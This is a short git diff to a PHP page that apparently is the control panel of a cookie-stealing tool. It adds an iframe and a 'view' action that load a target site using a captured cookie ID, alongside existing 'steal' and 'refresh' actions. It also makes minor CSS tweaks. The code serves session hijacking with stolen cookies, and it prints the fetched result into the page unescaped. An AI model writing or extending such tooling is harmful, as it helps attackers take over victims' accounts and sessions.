@@ -23,6 +23,7 @@ if(isset($_GET['action'])) {
     case 'refresh':
       $result = $catcher->refresh($_GET['cookieID']);
       $message .= $result ? "Cookie #".htmlspecialchars($_GET['cookieID'])." Refreshed<br/>" : "An error occurred.<br/>";
+      $message .= "<iframe id=\"frame\" src=\"http://".$site_URL."?cookieID=".htmlspecialchars($_GET['cookieID'])."&action=view\"></iframe>";
       break;
     case 'refresh-all':
       //do something
@@ -37,6 +38,11 @@ if(isset($_GET['action'])) {
     case 'steal':
       $result = $catcher->steal($_GET['cookieID']);
       $message = "<pre id=\"payload2\">$result</pre>";
+      break;
+    case 'view':
+      $result = $catcher->refresh($_GET['cookieID']);
+      $message .= "<div id=\"view\">".$result."</div>";
+      print $message; die();
       break;
     default:
       //do nothing
@@ -69,7 +75,7 @@ if($cookies->recordCount>0) {
 <style>
 h1,h2,h3 { color:#333; font-family: 'Crushed', cursive; }
 body {
-background: #cedce7;
+background: #cedce7!important;
 background: -moz-linear-gradient(top,  #cedce7 0%, #596a72 100%);
 background: -webkit-gradient(linear, left top, left bottom, color-stop(0%,#cedce7), color-stop(100%,#596a72));
 background: -webkit-linear-gradient(top,  #cedce7 0%,#596a72 100%);
@@ -83,6 +89,7 @@ height:1500px;
 #payload2 { padding:10px; background:#ffffff; border:1px dashed #666666; text-align:left; font-family:courier; color:#666 }
 span { font-family: courier; font-size:12px; }
 #tag { padding:2px; background:#666; color:#ffffff; font-weight: normal; font-size:12px; text-align:center; width:80px;}
+#frame { width:100%; height:400px; border:1px dashed #666666; }
 
 </style>
 </head>
